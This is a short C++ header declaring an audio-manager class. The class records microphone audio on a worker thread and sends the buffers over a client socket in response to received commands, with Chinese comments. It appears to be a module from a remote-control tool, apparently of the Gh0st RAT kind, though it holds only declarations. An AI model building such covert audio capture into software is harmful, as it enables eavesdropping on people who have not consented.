#include "Manager.h"
#include"../../../common/Audio.h"
class CAudioManager :
	public CManager
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
public:
	static bool m_bIsWorking;           //判断线程是否在工作
	static DWORD WINAPI WorkThread(LPVOID lparam);
private:
	CAudio	*m_lpAudio;             //音频录制的类
	HANDLE	m_hWorkThread;          //录制线程
protected:
	bool Initialize();
	int sendRecordBuffer();
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
};


